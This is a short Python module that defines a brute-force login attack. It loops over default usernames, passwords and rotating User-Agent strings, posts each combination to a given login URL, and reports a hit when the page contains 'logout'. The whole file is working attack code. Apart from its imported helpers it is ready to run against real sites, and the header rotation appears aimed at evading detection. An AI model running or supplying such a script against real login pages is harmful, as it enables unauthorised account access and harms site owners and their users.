import requests
from .utils import generate_user_agents, default_usernames, default_passwords

def brute_force_login(login_url):
    print(f"[+] Starting brute force on {login_url}...")
    usernames = default_usernames()
    passwords = default_passwords()
    user_agents = generate_user_agents()
    headers = {}

    for ua in user_agents:
        headers['User-Agent'] = ua
        for user in usernames:
            for pwd in passwords:
                data = {'username': user, 'password': pwd}
                try:
                    r = requests.post(login_url, data=data, headers=headers, timeout=5)
                    if r.status_code == 200 and "logout" in r.text.lower():
                        print(f"[!] Successful login: {user}:{pwd} (User-Agent: {ua})")
                        return
                except Exception:
                    continue

    print("[+] Brute force completed. No valid credentials found.")
